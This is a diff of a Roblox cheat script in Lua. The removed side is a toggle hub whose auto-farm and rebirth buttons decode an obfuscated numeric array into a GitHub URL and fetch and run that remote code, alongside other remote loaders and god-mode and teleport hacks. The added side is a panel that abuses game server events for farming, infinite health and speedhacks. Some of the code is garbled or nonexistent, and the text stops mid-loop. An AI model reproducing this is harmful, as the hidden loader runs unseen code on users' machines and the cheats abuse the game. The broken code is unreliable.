@@ -1,122 +1,144 @@
-   Title = "Aizen farm",
-   Content = "Test Tbh",
-   Duration = 5,
-   Image = nil,
-   Actions = { 
-      Ignore = {
-         Name = "Aizen!",
-         Callback = function()
-         print("The user tapped Okay!")
-      end
-   },
-},
-})
 
-local Toggle = MainTab:CreateToggle({
-   Name = "Auto Farm",
-   CurrentValue = true,
-   Flag = "Toggle1", 
-   Callback = function(Value)
-        function RdAEnmeUAMCtkWmTBZPtEXKXlaIVEnJ(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end loadstring(game:HttpGet(RdAEnmeUAMCtkWmTBZPtEXKXlaIVEnJ({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,8190,5145,5775,8715,5355,4935,8715,10395,11970,11025,11760,12180,4935,11445,10185,11025,11550,4935,8400,12285,10290,11340,11025,10395,4830,11340,12285,10185})))() 
-   -- The variable (Value) is a boolean on whether the toggle is true or false
-   end,
-})
+local Settings = {
+Farm = true,
+Transform = true,
+GodMode = true,
+Rebirth = true,
+AutoCharge = true,
+AutoHeal = true,
+AutoShield = true,
+Speedhack = true,
+}
 
-local Slider = MainTab:CreateSlider({
-   Name = "Fly Speed",
-   Range = {0, 100000},
-   Increment = 10,
-   Suffix = "Speed",
-   CurrentValue = 16,
-   Flag = "Slider1", 
-   Callback = function(Value)
-       game.Players.LocalPlayer.Character.Humanoid.Flyspeed = (Value)
-   end,
-})
+local Synapse = require(game:GetService("farme"))
 
-local Toggle = MainTab:CreateToggle({
-   Name = "Auto Rebirth",
-   CurrentValue = true,
-   Flag = "Toggle1", 
-   Callback = function(Value)
-       function RdAEnmeUAMCtkWmTBZPtEXKXlaIVEnJ(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end loadstring(game:HttpGet(RdAEnmeUAMCtkWmTBZPtEXKXlaIVEnJ({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,8190,5145,5775,8715,5355,4935,8715,10395,11970,11025,11760,12180,4935,11445,10185,11025,11550,4935,8400,12285,10290,11340,11025,10395,4830,11340,12285,10185})))() 
-   end,
-})
-
-local Toggle = MainTab:CreateToggle({
-   Name = "God Mode",
-   CurrentValue = true,
-   Flag = "Toggle1", 
-   Callback = function(Value)
-        local LocalPlayer = game:GetService("Players").LocalPlayer
- 
-local function Invincibility()
-    if LocalPlayer.Character then
-        for i, v in pairs(LocalPlayer.Character:GetChildren()) do
-            if v.Name == "hitbox" then
-                v:Destroy()
-            end
-        end
-    end
-end
- 
-while wait(0.5) do
-    Invincibility(LocalPlayer)
-end    
-   end,
-})
-
-local Toggle = MainTab:CreateToggle({
-   Name = "Auto Charge ",
-   CurrentValue = true,
-   Flag = "Toggle1", 
-   Callback = function(Value)
-        loadstring(game:HttpGet("https://[Log in to view URL]"))()
-   end,
-})
-
-local Dropdown = MainTab:CreateDropdown({
-   Name = "Teleport",
-   Options = {"Earth","Bills Planet"},
-   CurrentOption = {"Earth"},
-   MultipleOptions = false,
-   Flag = "Teleport", 
-   Callback = function(Options)
-local TeleportService = game:GetService("TeleportService")
-local function teleportPlayer(player, destinationPlaceId, destinationSpawnName)
-    local success, errorMessage = pcall(function()
-        local teleportData = TeleportService:GetPlayerPlaceInstanceAsync(destinationPlaceId)
-        local spawnInfo = teleportData:GetSpawnInfo(destinationSpawnName)
-        return spawnInfo
-    end)
-
-    if success then
-        TeleportService:TeleportToPlaceInstance(destinationPlaceId, success.id, player)
-    else
-        warn("Teleport failed: " .. errorMessage)
-    end
+local function farm()
+-- Farmar recursos específicos
+game:GetService("ReplicatedStorage").Package.Events.Qaction:InvokeServer("Farm", "Recursos")
+-- Caçar mobs específicos
+game:GetService("ReplicatedStorage").Package.Events.p:FireServer("Mob", "kid nohag")
 end
 
--- Connect the teleportation function to a trigger event
--- Replace "Teleport trigger" with the actual trigger object in your game
-script.Parent.Touched:Connect(function(triggerPart)
-    -- Make sure the part touched is a player
-    local character = triggerPart.Parent"Kito", "Wukong"
-    local humanoid = character:FindFirstChild("Humanoid")
-    if humanoid then
-        teleportPlayer(character.Parent,3311165597, "Earth", "Bills Planet")
-    end
-end)
-       
-   end,
+local function transform()
+game:GetService("ReplicatedStorage").Package.Events.equipskill:InvokeServer("FSSJ", "Kaioken")
+end
+
+local function godMode()
+game.Players.LocalPlayer.Character.Status.Blocking.Parent = nil
+game.Players.LocalPlayer.Character.Humanoid.MaxHealth = math.huge
+end
+
+local function rebirth()
+game:GetService("ReplicatedStorage").Package.Events.reb:InvokeServer()
+end
+
+local function autoCharge()
+game:GetService("ReplicatedStorage").Package.Events.cha:InvokeServer("AutoCharge")
+end
+
+local function autoHeal()
+game.Players.LocalPlayer.Character.Humanoid.Health = 100
+end
+
+local function autoShield()
+game.Players.LocalPlayer.Character.Status.Shield.Value = true
+end
+
+local function speedhack()
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 1000
+end
+
+
+local Painel = Synapse:CreateWindow({
+Name = "amores do Aizen",
+Size = UDim2.new(0, 300, 0, 200),
+Position = UDim2.new(0.5, -150, 0.5, -100),
+Color = Color3.new(0.54, 0.83, 0.42)
 })
 
-local Toggle = MainTab:CreateToggle({
-   Name = "Auto Transform",
-   CurrentValue = false,
-   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
-   Callback = function(Value)
-        loadstring(game:HttpGet("https://[Log in to view URL]"))()   
-   -- The variable (Value) is a boolean on whether the toggle is true or false
-   end,
+local BotaoFarm = Painel:CreateButton({
+Name = "farma",
+Callback = function()
+Settings.Farm = not Settings.Farm
+end,
+Color = Color3.new(0, 0, 0)
 })
+
+local BotaoTransform = Painel:CreateButton({
+Name = "Transform",
+Callback = function()
+Settings.Transform = not Settings.Transform
+end,
+Color = Color3.new(0, 0, 0)
+})
+
+local BotaoGodMode = Painel:CreateButton({
+Name = "God Mode",
+Callback = function()
+Settings.GodMode = not Settings.GodMode
+end,
+Color = Color3.new(0, 0, 0)
+})
+
+local BotaoRebirth = Painel:CreateButton({
+Name = "Rebirth",
+Callback = function()
+Settings.Rebirth = not Settings.Rebirth
+end,
+Color = Color3.new(0, 0, 0)
+})
+
+local BotaoAutoCharge = Painel:CreateButton({
+Name = "Auto Charge",
+Callback = function()
+Settings.AutoCharge = not Settings.AutoCharge
+end,
+Color = Color3.new(0, 0, 0)
+})
+
+local BotaoAutoHeal = Painel:CreateButton({
+Name = "Auto Heal",
+Callback = function()
+Settings.AutoHeal = not Settings.AutoHeal
+end,
+Color = Color3.new(0, 0, 0)
+})
+
+local BotaoAutoShield = Painel:CreateButton({
+Name = "Auto Shield",
+Callback = function()
+Settings.AutoShield = not Settings.AutoShield
+end,
+Color = Color3.new(0, 0, 0)
+})
+
+local BotaoSpeedhack = Painel:CreateButton({
+Name = "Speedhack",
+Callback = function()
+Settings.Speedhack = not Settings.Speedhack
+end,
+Color = Color3.new(0, 0, 0)
+})
+
+local BotaoJumpboost = Painel:CreateButton({
+Name = "Jumpboost",
+Callback = function()
+Settings.Jumpboost = not Settings.Jumpboost
+end,
+Color = Color3.new(0, 0, 0)
+})
+
+while true do
+if Settings.Farm then
+farm()
+end
+if Settings.Transform then
+transform()
+end
+if Settings.GodMode then
+godMode()
+end
+if Settings.Rebirth then
+rebirth()
+end
+if Settings.AutoCharge then
